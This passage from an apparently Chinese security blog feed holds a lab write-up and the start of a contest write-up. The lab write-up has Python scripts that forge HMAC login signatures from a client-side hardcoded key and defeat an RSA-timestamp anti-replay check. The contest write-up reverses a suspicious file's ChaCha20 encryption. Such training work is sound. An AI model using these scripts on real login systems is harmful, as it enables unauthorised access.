<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>)<br>.<span class="hljs-property">value</span>;<br><br><span class="hljs-keyword">const</span> nonce = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>()<br>.<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>)<br>.<span class="hljs-title function_">substring</span>(<span class="hljs-number">2</span>);<br><span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() / <span class="hljs-number">1000</span>);<br><br><span class="hljs-keyword">const</span> secretKey = <span class="hljs-string">&quot;be56e057f20f883e&quot;</span>;<br><br><span class="hljs-keyword">const</span> dataToSign = username + password + nonce + timestamp;<br><span class="hljs-keyword">const</span> signature = <span class="hljs-title class_">CryptoJS</span>.<span class="hljs-title class_">HmacSHA256</span>(dataToSign, secretKey).<span class="hljs-title function_">toString</span>(<span class="hljs-title class_">CryptoJS</span>.<span class="hljs-property">enc</span>.<span class="hljs-property">Hex</span>);<br></code></pre></td></tr></table></figure><p>nonce：小写字母和数字组成的随机字符串</p><p>dataToSign：<code>username + password + nonce + timestamp</code></p><p>signature：由 <code>dataToSign</code> 经过 <code>SHA256</code> 加密生成，<code>secretKey</code>为固定值 <code>be56e057f20f883e</code></p><p>使用了 HmacSHA256 对 username、password、nonce、timestamp 进行了签名校验，但是拿到了 Key，所以可以伪造签名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pprint<br><br>url = <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/encrypt/signdata.php&quot;</span><br>secret_key = <span class="hljs-string">&quot;be56e057f20f883e&quot;</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br>password = <span class="hljs-string">&quot;123456&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_nonce</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_signature</span>(<span class="hljs-params">username, password, nonce, timestamp, key</span>):<br>    data_to_sign = username + password + nonce + <span class="hljs-built_in">str</span>(timestamp)<br>    <span class="hljs-keyword">return</span> hmac.new(key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), data_to_sign.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>), hashlib.sha256).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_signed_request</span>():<br>    nonce = generate_nonce()<br>    timestamp = <span class="hljs-built_in">int</span>(time.time())<br>    signature = generate_signature(username, password, nonce, timestamp, secret_key)<br><br>    headers = &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/easy.php&quot;</span>,<br>    &#125;<br><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: username,<br>        <span class="hljs-string">&quot;password&quot;</span>: password,<br>        <span class="hljs-string">&quot;nonce&quot;</span>: nonce,<br>        <span class="hljs-string">&quot;timestamp&quot;</span>: timestamp,<br>        <span class="hljs-string">&quot;signature&quot;</span>: signature<br>    &#125;<br><br>    response = requests.post(url, json=payload, headers=headers)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Status Code:&quot;</span>, response.status_code)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Headers:&quot;</span>)<br>    pprint.pprint(<span class="hljs-built_in">dict</span>(response.headers))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    send_signed_request()<br><br></code></pre></td></tr></table></figure><p>运行拿到结果</p><img src="https://img.dkdun.cn/v1/2025/12/50aafeeacc578756.png" style="zoom:50%;" /><h1 id="加签-key-在服务端"><a href="#加签-key-在服务端" class="headerlink" title="加签 key 在服务端"></a>加签 key 在服务端</h1><p>抓包返回了两个页面数据</p><p>第一个数据包获取 signature</p><img src="https://img.dkdun.cn/v1/2025/12/c4c2302b0347483c.png" style="zoom: 67%;" /><p>第二个数据包加上获取的 signature</p><img src="https://img.dkdun.cn/v1/2025/12/cd949891e855a459.png" style="zoom: 45%;" /><p>查看加密算法，发现先去服务端获取签名，然后对username，password，timestamp 进行签名再登录</p><img src="https://img.dkdun.cn/v1/2025/12/a28641ff88132106.png" style="zoom: 80%;" /><p>因为加解密都在服务器端完成所以无法伪造</p><h1 id="禁止重放"><a href="#禁止重放" class="headerlink" title="禁止重放"></a>禁止重放</h1><p>抓包，发现账号密码是明文的，多了一个 random 参数</p><img src="https://img.dkdun.cn/v1/2025/12/d4844a0fe13f080f.png" style="zoom: 50%;" /><p>定位算法调试</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateRequestData</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> username = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;username&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">const</span> password = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;password&quot;</span>).<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">const</span> timestamp = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();<br><br>    <span class="hljs-keyword">const</span> publicKey = <span class="hljs-string">`-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----`</span>;<br><br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">rsaEncrypt</span>(<span class="hljs-params">data, publicKey</span>) &#123;<br>        <span class="hljs-keyword">const</span> jsEncrypt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSEncrypt</span>(); <br>        jsEncrypt.<span class="hljs-title function_">setPublicKey</span>(publicKey);<br>        <span class="hljs-keyword">const</span> encrypted = jsEncrypt.<span class="hljs-title function_">encrypt</span>(data.<span class="hljs-title function_">toString</span>());<br>        <span class="hljs-keyword">if</span> (!encrypted) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;RSA encryption failed.&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> encrypted;<br>    &#125;<br><br>    <span class="hljs-comment">// Encrypt the timestamp</span><br>    <span class="hljs-keyword">let</span> encryptedTimestamp;<br>    <span class="hljs-keyword">try</span> &#123;<br>        encryptedTimestamp = <span class="hljs-title function_">rsaEncrypt</span>(timestamp, publicKey);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;Encryption error:&quot;</span>, error);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">const</span> dataToSend = &#123;<br>        <span class="hljs-attr">username</span>: username,<br>        <span class="hljs-attr">password</span>: password,<br>        <span class="hljs-attr">random</span>: encryptedTimestamp <span class="hljs-comment">// Replace timestamp with encrypted version</span><br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> dataToSend;<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">sendLoginRequest</span>(<span class="hljs-params">url</span>) &#123;<br><span class="hljs-keyword">const</span> dataToSend = <span class="hljs-title function_">generateRequestData</span>();<br></code></pre></td></tr></table></figure><p>通过算法可以知道 <code>random</code> 是通过 <code>encryptedTimestamp</code> 来的，<code>encryptedTimestamp</code> 是通过时间戳经过 <code>RSA</code> 加密来的</p><img src="https://img.dkdun.cn/v1/2025/12/dc27fd56d716f26a.png" style="zoom: 50%;" /><p>防止请求被重放，同样写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> PKCS1_v1_5<br><span class="hljs-keyword">import</span> pprint<br><br>url = <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/encrypt/norepeater.php&quot;</span><br>public_key = <span class="hljs-string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span><br><span class="hljs-string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi</span><br><span class="hljs-string">NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM</span><br><span class="hljs-string">DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb</span><br><span class="hljs-string">ocDbsNeCwNpRxwjIdQIDAQAB</span><br><span class="hljs-string">-----END PUBLIC KEY-----&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_encrypt</span>(<span class="hljs-params">data, public_key</span>):<br>    key = RSA.import_key(public_key)<br>    cipher = PKCS1_v1_5.new(key)<br>    encrypted_data = cipher.encrypt(data.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-keyword">return</span> b64encode(encrypted_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_request</span>():<br>    ts = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time() * <span class="hljs-number">1000</span>))<br>    encrypted_ts = rsa_encrypt(ts, public_key)<br>    headers = &#123;<br>        <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json&quot;</span>,<br>        <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;PHPSESSID=snuhsl9mkun6ftjd3481d3g5nd&quot;</span>,<br>        <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>: <span class="hljs-string">&quot;http://172.22.9.123/encrypt-labs-main/easy.php&quot;</span>,<br>    &#125;<br><br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123456&quot;</span>,<br>        <span class="hljs-string">&quot;random&quot;</span>: encrypted_ts<br>    &#125;<br>    response = requests.post(url, headers=headers, json=payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Status Code:&quot;</span>, response.status_code)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Headers:&quot;</span>)<br>    pprint.pprint(<span class="hljs-built_in">dict</span>(response.headers))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Response Body:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(response.text)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    send_request()<br>    time.sleep(<span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure><p>成功</p><img src="https://img.dkdun.cn/v1/2025/12/5fe8ce2926b379e1.png" style="zoom: 80%;" />]]></content>
    
    
    <categories>
      
      <category>JS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-4月</title>
    <link href="/2025/05/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/"/>
    <url>/2025/05/06/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-4%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>放假玩嗨了，忘记更新了</p><span id="more"></span><h1 id="可疑文件"><a href="#可疑文件" class="headerlink" title="可疑文件"></a>可疑文件</h1><p>发现对文件 <code>f.txt</code> 加密，密码为 <code>qewuri</code></p><img src="https://img.dkdun.cn/v1/2025/12/c5c5dc57980e53d9.png" alt="image-20250426103106468" style="zoom: 50%;" /><p><code>sub_18007B240</code> 实现了一个流加密算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007B240</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *v3; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  _BYTE v6[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v7; <span class="hljs-comment">// [rsp+20h] [rbp+0h] BYREF</span><br>  _DWORD v8[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+30h] [rbp+10h] BYREF</span><br>  _DWORD v9[<span class="hljs-number">9</span>]; <span class="hljs-comment">// [rsp+40h] [rbp+20h] BYREF</span><br>  <span class="hljs-type">int</span> v10; <span class="hljs-comment">// [rsp+64h] [rbp+44h] BYREF</span><br>  _BYTE v11[<span class="hljs-number">56</span>]; <span class="hljs-comment">// [rsp+88h] [rbp+68h] BYREF</span><br>  _BYTE v12[<span class="hljs-number">96</span>]; <span class="hljs-comment">// [rsp+C0h] [rbp+A0h] BYREF</span><br>  _BYTE v13[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+120h] [rbp+100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v14; <span class="hljs-comment">// [rsp+178h] [rbp+158h]</span><br>  <span class="hljs-type">unsigned</span> __int64 j; <span class="hljs-comment">// [rsp+198h] [rbp+178h]</span><br><br>  v3 = &amp;v7;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">102</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v3 = <span class="hljs-number">-858993460</span>;<br>    v3 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  <span class="hljs-built_in">memset</span>(v11, <span class="hljs-number">0</span>, <span class="hljs-number">0xCu</span>);<br>  <span class="hljs-built_in">qmemcpy</span>(v8, <span class="hljs-string">&quot;expand 32-byte k&quot;</span>, <span class="hljs-built_in">sizeof</span>(v8));<br>  <span class="hljs-built_in">sub_1800757E3</span>(v9, a3, <span class="hljs-number">32</span>);<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">sub_1800757E3</span>(&amp;v10, v11, <span class="hljs-number">12</span>);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    v14 = <span class="hljs-built_in">sub_180074E79</span>(v13, <span class="hljs-number">1</span>, <span class="hljs-number">64</span>, a1);<br>    <span class="hljs-keyword">if</span> ( !v14 )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">sub_18007ABE0</span>(v8, v12);<br>    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v14; ++j )<br>    &#123;<br>      v13[j] ^= v12[j];<br>      ++v13[j];<br>    &#125;<br>    <span class="hljs-built_in">sub_1800772F0</span>(v13, <span class="hljs-number">1</span>, v14, a2);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_180076850</span>(v6, &amp;unk_180167DA0);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进发现 <code>sub_18007ABE0</code> 是 ChaCha20 加密算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007ABE0</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// rdi</span><br>  __int64 i; <span class="hljs-comment">// rcx</span><br>  _BYTE v5[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [rsp+20h] [rbp+0h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [rsp+30h] [rbp+10h] BYREF</span><br>  _BYTE v8[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+34h] [rbp+14h] BYREF</span><br>  _BYTE v9[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+38h] [rbp+18h] BYREF</span><br>  _BYTE v10[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+3Ch] [rbp+1Ch] BYREF</span><br>  _BYTE v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+40h] [rbp+20h] BYREF</span><br>  _BYTE v12[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+44h] [rbp+24h] BYREF</span><br>  _BYTE v13[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+48h] [rbp+28h] BYREF</span><br>  _BYTE v14[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+4Ch] [rbp+2Ch] BYREF</span><br>  _BYTE v15[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+50h] [rbp+30h] BYREF</span><br>  _BYTE v16[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+54h] [rbp+34h] BYREF</span><br>  _BYTE v17[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+58h] [rbp+38h] BYREF</span><br>  _BYTE v18[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+5Ch] [rbp+3Ch] BYREF</span><br>  _BYTE v19[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+60h] [rbp+40h] BYREF</span><br>  _BYTE v20[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+64h] [rbp+44h] BYREF</span><br>  _BYTE v21[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+68h] [rbp+48h] BYREF</span><br>  _BYTE v22[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [rsp+6Ch] [rbp+4Ch] BYREF</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+84h] [rbp+64h]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+A4h] [rbp+84h]</span><br>  <span class="hljs-type">int</span> m; <span class="hljs-comment">// [rsp+C4h] [rbp+A4h]</span><br>  <span class="hljs-type">int</span> *v26; <span class="hljs-comment">// [rsp+198h] [rbp+178h]</span><br><br>  v2 = &amp;v6;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">50</span>; i; --i )<br>  &#123;<br>    *(_DWORD *)v2 = <span class="hljs-number">-858993460</span>;<br>    v2 += <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  <span class="hljs-built_in">sub_1800757E3</span>(&amp;v7, a1, <span class="hljs-number">64</span>);<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">20</span>; j += <span class="hljs-number">2</span> )<br>  &#123;<br>    v26 = &amp;v7;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(&amp;v7, v11, v15, v19);<br>    v26 = (<span class="hljs-type">int</span> *)v8;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v8, v12, v16, v20);<br>    v26 = (<span class="hljs-type">int</span> *)v9;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v9, v13, v17, v21);<br>    v26 = (<span class="hljs-type">int</span> *)v10;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v10, v14, v18, v22);<br>    v26 = &amp;v7;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(&amp;v7, v12, v17, v22);<br>    v26 = (<span class="hljs-type">int</span> *)v8;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v8, v13, v18, v19);<br>    v26 = (<span class="hljs-type">int</span> *)v9;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v9, v14, v15, v20);<br>    v26 = (<span class="hljs-type">int</span> *)v10;<br>    <span class="hljs-built_in">sub_18007B4B0</span>(v10, v11, v16, v21);<br>  &#125;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">16</span>; ++k )<br>    *(_DWORD *)&amp;v8[<span class="hljs-number">4</span> * k - <span class="hljs-number">4</span>] += *(_DWORD *)(a1 + <span class="hljs-number">4LL</span> * k);<br>  <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">16</span>; ++m )<br>  &#123;<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m) = v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>];<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m + <span class="hljs-number">1</span>) = <span class="hljs-built_in">BYTE1</span>(*(_DWORD *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>    *(_BYTE *)(a2 + <span class="hljs-number">4</span> * m + <span class="hljs-number">2</span>) = <span class="hljs-built_in">BYTE2</span>(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>    *(_BYTE *)(a2 + <span 